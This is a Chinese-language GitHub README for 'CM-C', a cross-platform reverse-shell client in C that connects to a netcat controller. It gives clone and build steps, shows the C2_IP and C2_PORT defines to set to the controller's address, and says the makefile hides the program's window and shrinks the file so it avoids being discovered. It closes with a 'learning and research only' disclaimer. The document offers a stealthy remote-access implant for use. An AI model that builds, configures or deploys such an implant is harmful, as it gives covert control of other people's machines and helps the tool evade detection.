# [CM-C](https://github.com/XiaoZhang-qd/cm-c "项目链接")
## 项目介绍
[CM-C](https://github.com/XiaoZhang-qd/cm-c "项目链接")是一个由C语言编写的反向Shell受控端。
用gcc或者clang、cl等等的编译器来编译后可直接运行。
控制端可以使用NetCat的nc或者ncat等等作为控制端。
已在[makefile](./makefile)里进入隐藏窗口和减少文件体积的编译命令，可避免被发现。
本项目可支持所以操作系统编译并执行

### 已经通过测试后可用的操作系统
- Windows
- Linux
- Macos(Datwin)

### 复制克隆命令:

```git
git clone https://github.com/XiaoZhang-qd/CM-C
```
### 进入项目目录:

```cd
cd CM-C
```
### 修改main.c源代码的C2_IP和C2_PORT为你的控制端IP和端口:

```c
#ifndef C2_IP
    #define C2_IP "127.0.0.1"
#endif
#ifndef C2_PORT
    #define C2_PORT 4444
#endif

```

#### 或者您可以直接使用make编译，他会要求你填入IP与端口
````makefile
make
````

## 编译

- 你需要先有make工具链
- Windows 系统可用MinGW、MSYC、MSYC2、Cygwin（可能会需要依赖cygwin1.dll）、WSL等等
- 其他的系统（如Linux、macOS、BSD等等）如果有你需要先有make工具链可直接编译。

````makefile
make
````

## 使用声明
- 本项目仅用于学习和研究，不建议在生产环境中使用。
- 本项目不承担任何责任，不承担任何法律风险。
- 请在合法范围内使用本项目，不用于任何违法活动。
- 请在使用本项目时，遵守当地的法律和法规。
